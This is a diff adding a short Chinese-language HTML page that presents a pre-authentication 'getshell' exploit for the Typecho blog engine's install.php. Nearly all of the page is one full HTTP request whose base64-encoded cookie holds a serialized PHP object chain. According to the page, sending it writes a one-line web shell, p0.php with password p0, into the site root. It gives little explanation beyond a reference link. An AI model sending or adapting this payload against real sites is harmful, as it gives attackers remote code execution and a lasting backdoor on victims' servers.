@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
+<title>Typecho前台getshell</title>
+<style>
+			body{
+				width: 92%;
+				background-color:#B2DFEE;
+				padding:0 4%;
+			}
+			*{
+				margin: 0 auto;
+				padding: 0;
+			}
+		</style>
+		</head>
+<body >
+<div>
+
+
+<br/><br/>
+<!--文章title-->
+<center>
+<font style="FONT-FAMILY: Comic Sans MS;"><strong><h2>Typecho前台getshell</h2></strong></font>
+</center>
+<!--主体内容-->
+<div><br/><br/>
+<p style="text-indent:32px">Typecho前台getshell(漏洞文件install.php)</p><br/>
+<p style="text-indent:32px">如下Payload<a href="http://www.laimooc.cn/">可base64decode一下cookie部分看看</a></p><br/>
+<p style="text-indent:32px">
+<textarea rows="20" cols="100" >
+
+GET /typecho/install.php?finish=1 HTTP/1.1
+Host: 192.168.211.169
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:55.0) Gecko/20100101 Firefox/55.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Cookie: __typecho_config=YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6NDp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo4OiJBVE9NIDEuMCI7czoyMjoiAFR5cGVjaG9fRmVlZABfY2hhcnNldCI7czo1OiJVVEYtOCI7czoxOToiAFR5cGVjaG9fRmVlZABfbGFuZyI7czoyOiJ6aCI7czoyMDoiAFR5cGVjaG9fRmVlZABfaXRlbXMiO2E6MTp7aTowO2E6MTp7czo2OiJhdXRob3IiO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO3M6NTc6ImZpbGVfcHV0X2NvbnRlbnRzKCdwMC5waHAnLCAnPD9waHAgQGV2YWwoJF9QT1NUW3AwXSk7Pz4nKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fX19czo2OiJwcmVmaXgiO3M6NzoidHlwZWNobyI7fQ==
+Referer:http://192.168.211.169/typecho/install.php
+Connection: close
+Upgrade-Insecure-Requests: 1
+</textarea></p><br/>
+<p style="text-indent:32px">会在网站根目录下生产一句话p0.php，密码p0<a href="http://www.laimooc.cn/"></a></p><br/>
+<p style="text-indent:32px">具体详情看下面链接分析</p><br/>
+<p style="text-indent:32px">参考链接：https://www.t00ls.net/articles-42355.html</p><br/>
+
+<p style="text-indent:32px"></p><br/>
+</div><br/><br/>
+
+<center>
+<h4 >漏洞摘要：2017-10-25&nbsp;&nbsp; </h4><br/>
+<input type="button" name="button1" id="button1" value="返回" onclick="history.go(-1)"> OR
+<input type="button" name="button1" id="button1" value="打印" onclick="javascript:window.print()"> <br/><br/>
+<script type="text/javascript">document.write(['<a href="http://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=',encodeURIComponent(location.href),'&title=',encodeURIComponent(document.title),'" target="_blank"  style="text-decoration:none;"  title="分享到QQ空间">分享到QQ空间<\/a>'].join(''));</script>
+</center>
+</div>
+<br/><br/>
+
+</body>
+</html>
